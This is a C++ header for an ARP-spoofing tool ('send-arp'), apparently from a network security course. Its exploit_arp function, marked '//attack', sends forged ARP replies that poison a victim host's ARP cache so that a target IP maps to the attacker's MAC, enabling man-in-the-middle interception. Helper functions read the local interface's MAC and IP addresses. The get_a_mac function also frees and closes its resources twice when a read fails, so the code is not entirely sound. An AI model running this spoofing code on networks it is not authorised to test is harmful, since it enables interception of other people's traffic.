#pragma once
#include <bits/stdc++.h>
#include <fcntl.h>
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include "ethhdr.h"
#include "arphdr.h"

#define ETHER_HDR_LEN 14

#define MAC_LEN 17
#define IP_LEN 15

#define ARP_REQ false
#define ARP_REP true

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void send_arp(pcap_t* handle, const char* d_mac, const char* s_mac, const char* s_ip, const char* t_mac, const char* t_ip, bool mode)
{
   	EthArpPacket packet;
    
    packet.eth_.dmac_ = Mac(d_mac);
	packet.eth_.smac_ = Mac(s_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	
    packet.arp_.op_ = (mode == ARP_REQ ? htons(ArpHdr::Request) : htons(ArpHdr::Reply) );

    packet.arp_.smac_ = Mac(s_mac);
    packet.arp_.sip_ = htonl(Ip(s_ip));
    packet.arp_.tmac_ = Mac(t_mac);
    packet.arp_.tip_ = htonl(Ip(t_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void exploit_arp(pcap_t* handle, const char* s_mac, const char* s_ip, const char* a_mac, const char* t_ip)
{
	send_arp(handle, s_mac, a_mac, t_ip, s_mac, s_ip, ARP_REP); //attack
}



char* get_t_mac(uint8_t* mac)
{
    static __thread char buf[MAC_LEN + 1] = {0};
    snprintf(buf, sizeof(buf),
             "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}
char* get_s_mac(uint8_t* mac)
{
    static __thread char buf[MAC_LEN + 1] = {0};
    snprintf(buf, sizeof(buf),
             "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}

char* get_a_mac(const char* dev)
{
    static __thread char buf[MAC_LEN + 1] = {0};

    int len = strlen(dev);
    int sz = len + 0x18;
    char* path = (char*)malloc(sz);
    if (path == NULL)
    {
        perror("path malloc failed");
        exit(-1);
    }

    snprintf(path, sz, "%s%s%s", "/sys/class/net/", dev, "/address");
    int fd = open(path, O_RDONLY);
    if (fd == -1)
    {
        perror("open failed");
        exit(-1);
    }

    int bytes = read(fd, buf, MAC_LEN);
    if (bytes != MAC_LEN)
    {
        fprintf(stderr, "mac addr read failed");
        free(path);
        close(fd);
    }

    free(path);
    close(fd);
    return buf;
}

char* get_a_ip(const char* dev)
{
    struct ifreq ifr;
    static __thread char ip[IP_LEN + 1] = {0};

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == -1)
    {
        perror("socket creation failed");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl error");
        close(s);
        exit(-1);
    }
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));

    close(s);
    return ip;
}